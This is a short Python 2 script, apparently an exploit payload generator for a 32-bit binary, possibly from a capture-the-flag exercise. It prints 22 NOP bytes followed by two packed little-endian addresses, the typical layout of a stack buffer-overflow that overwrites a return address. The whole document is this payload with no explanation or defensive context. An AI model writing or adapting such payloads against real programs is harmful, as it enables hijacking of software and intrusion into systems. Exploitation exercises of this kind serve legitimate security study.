from struct import pack

def main():
	print "\x90"*22 + pack("<I", 0x08048eed) + pack("<I", 0x80c61e5)

if __name__ == '__main__':
	main()
